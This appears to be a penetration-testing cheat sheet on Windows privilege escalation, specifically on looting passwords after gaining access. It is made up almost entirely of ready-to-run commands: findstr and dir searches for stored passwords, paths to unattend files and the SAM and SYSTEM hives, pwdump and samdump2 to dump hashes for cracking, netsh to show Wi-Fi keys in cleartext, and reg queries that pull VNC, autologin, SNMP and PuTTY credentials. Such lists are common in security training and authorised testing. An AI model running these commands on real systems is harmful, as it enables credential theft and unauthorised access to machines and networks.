
**Using findstr:**

`findstr /si password *.txt`
`findstr /si password *.txt *.config *.ini *.xml
`findstr /spin "password" *.*`

(it checks only from the directory path)

**Common Files to lookout for passwords:**

```
C:\sysprep.inf
C:\sysprep\sysprep.xml
C:\unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

dir C:\*vnc.ini /s /b
dir C:\*ultravnc.ini /s /b
dir C:\ /s /b | findstr /si *vnc.ini

```

**EoP - Looting for passwords**

**SAM and SYSTEM Files**

The Security Account Manager (SAM), is a database file. The user passwords are stored in a hashed format in a registry hive either as a LM hash or NTLM hash. This file can be found in 
%SystemRoot%/system32/config/SAM and is mounted on HKLM/SAM

```
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

**Generate a hash file for John using pwdump or samdump2**

`pwdump SYSTEM SAM > sam.txt`
`samdump2 SYSTEM SAM -o sam.txt

**WIFI Passwords:**

Find Access Point SSID:

`netsh wlan show profile

Get Cleartext Pass

`netsh wlan show profile <SSID> key=clear`

**Registry : Looking for passwords**

`reg query "HKCU\Software\ORL\WinVNC3\Password`     (VNC)
`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"`  (Windows Autologin)

`reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"`     (SNMP Parameters)
`reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"`             (Putty)

Search for passwords in registry

```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```


